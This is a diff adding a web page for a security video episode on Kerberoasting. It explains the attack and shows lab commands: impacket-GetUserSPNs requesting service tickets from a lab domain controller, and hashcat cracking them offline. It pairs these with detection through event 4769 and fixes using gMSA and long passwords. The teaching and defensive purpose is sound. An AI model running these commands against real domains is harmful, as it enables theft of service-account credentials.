@@ -1,0 +1,60 @@
+---
+title: Kerberoasting, explained in 14 minutes
+description: Any domain user can request a service ticket and crack it offline. How it works, the lab, and how to detect and fix it.
+date: 2026-10-18
+verified: 2026-10-18
+series: excuse-me-root
+episode: 31
+thumbTitle: Kerberoasting
+tone: slate
+duration: "14:08"
+youtubeId: ""
+caption: Any domain user can ask for a service ticket.
+severity: high
+topics: [active-directory, red-team, blue-team]
+offensive: true
+notes: kerberos-in-one-page
+labFiles:
+  label: Lab files (ZIP, 4 MB)
+  href: https://github.com/NeoPwnsPolitely
+chapters:
+  - { time: "00:00", label: What Kerberoasting is }
+  - { time: "01:35", label: Kerberos in 90 seconds }
+  - { time: "03:10", label: Why service tickets can be cracked }
+  - { time: "05:45", label: "Lab: request tickets" }
+  - { time: "08:20", label: "Lab: crack offline" }
+  - { time: "10:30", label: "Detect it: event 4769" }
+  - { time: "12:40", label: "Fix it: gMSA and long passwords" }
+references:
+  - { label: "MITRE ATT&CK T1558.003 (attack.mitre.org)", href: "https://attack.mitre.org/techniques/T1558/003/" }
+  - { label: "Impacket (github.com)", href: "https://github.com/fortra/impacket" }
+  - { label: "Hashcat (hashcat.net)", href: "https://hashcat.net/hashcat/" }
+---
+
+## Summary
+
+Kerberoasting abuses a normal part of Kerberos. Any domain user can request a service ticket for an account that has a Service Principal Name (SPN). Part of that ticket is encrypted with the service account's password hash, so it can be cracked offline.
+
+The attack is quiet and needs no special rights. The defence is mostly about passwords: long, random secrets on service accounts, or managed accounts that rotate them for you.
+
+## Commands from this video
+
+Replace `<USER>`, `<PASSWORD>` and `<WORDLIST>` with your lab values. The domain controller is `10.10.10.5` in the lab.
+
+<CodeBlock
+  lang="bash"
+  host="attacker (Kali, lab)"
+  lines={[
+    { out: "# Request tickets for every account with an SPN" },
+    "$ impacket-GetUserSPNs lab.local/<USER>:<PASSWORD> -dc-ip 10.10.10.5 -request -outputfile hashes.txt",
+    "ServicePrincipalName          Name      MemberOf",
+    "MSSQLSvc/sql01.lab.local:1433 svc_sql   CN=SQL Admins",
+    "$ hashcat -m 13100 hashes.txt <WORDLIST>",
+  ]}
+/>
+
+<Callout type="defence" title="detect and fix">
+  Alert on Windows event 4769 (a Kerberos service ticket was requested) with ticket encryption type `0x17` (RC4), from one account to many SPNs in a short time.
+
+  Fix: move services to group Managed Service Accounts (gMSA), or set random passwords of 25 or more characters, and allow AES only for Kerberos.
+</Callout>
